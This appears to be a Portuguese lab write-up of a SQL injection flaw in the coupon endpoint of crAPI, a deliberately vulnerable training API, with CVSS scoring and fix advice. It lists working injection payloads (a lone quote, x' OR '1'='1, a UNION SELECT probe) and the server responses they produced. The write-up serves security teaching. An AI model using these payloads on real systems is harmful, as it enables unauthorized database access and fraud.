🇧🇷 Português · [🇺🇸 English](../en/vulnerabilities/10-sql-injection.md)

# SQL Injection — `coupon_code` em query SQL sem sanitização

**Categoria OWASP API Security Top 10 (2023):** Injeção — não é uma categoria isolada no Top 10 de 2023 (era `API8:2019 — Injection`); hoje se enquadra como entrada não validada / falha de implementação.
**Severidade (CVSS v3.1):** `Alta · 8.8` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**Desafio crAPI correspondente:** Challenge 13 — "redeem a coupon that was already claimed" (SQL injection)

---

## 1. Resumo

O endpoint que aplica um cupom (`apply_coupon`) concatena o campo `coupon_code` diretamente em uma consulta **SQL (PostgreSQL)**, sem sanitização. Isso permite quebrar a query (error-based) e manipular a cláusula `WHERE` (boolean-based) — abrindo caminho para burlar verificações (como "cupom já resgatado") e, no limite, extrair dados do banco.

## 2. Pré-condições

- Conta autenticada qualquer (com token válido).

## 3. Passo a passo da exploração

1. Uso legítimo:

```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": "TRAC075", "amount": 75 }
```

2. **Error-based** — injetar uma aspa simples quebra a sintaxe da query e gera erro 500, revelando que a entrada entra crua no SQL:

```json
{ "coupon_code": "TRAC075'", "amount": 75 }
```

3. **Boolean-based** — injetar uma condição sempre verdadeira altera o resultado da query:

```json
{ "coupon_code": "x' OR '1'='1", "amount": 75 }
```

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/10-sql-injection/captura.txt`](../../evidencias/10-sql-injection/captura.txt).

```
1) coupon_code = "TRAC075'"              -> HTTP 500 (Server Error)        [error-based]
2) coupon_code = "x' OR '1'='1"          -> HTTP 400
   {"message":"TRAC075 Coupon code is already claimed by you!! ..."}
3) coupon_code = "nonexist' UNION SELECT NULL--" -> HTTP 500 (Server Error)
```

Dois sinais confirmam a injeção:
- **Error-based:** a aspa simples e o `UNION` com número de colunas errado quebram a query (HTTP 500).
- **Boolean-based:** o input foi `x' OR '1'='1` — um código que **não existe** —, mas a resposta cita **`TRAC075`**. O `OR '1'='1'` injetado tornou a cláusula `WHERE` sempre verdadeira, fazendo a query casar o cupom existente. Ou seja, a entrada controla a lógica da consulta.

## 5. Por que é um risco

SQL injection é uma das falhas mais graves: permite **ler, alterar ou apagar** dados do banco, burlar autenticação/validações e, em muitos casos, escalar para comprometimento do servidor. Aqui o vetor imediato é fraudar o fluxo de cupons (resgatar um já usado), mas o mesmo ponto de injeção costuma permitir extração de dados arbitrários.

## 6. Como corrigir

> 🛠️ **[PoC de correção](../poc-correcao-sqli.md)** — patch aplicado no crAPI local com o antes/depois comprovando a eliminação da injeção.

- Usar **consultas parametrizadas / prepared statements** (bind de parâmetros) — nunca concatenar entrada do usuário em SQL.
- Validar/normalizar o formato esperado do `coupon_code`.
- Princípio do menor privilégio no usuário do banco e tratamento de erros que não vaze detalhes internos.

## 7. Referências

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
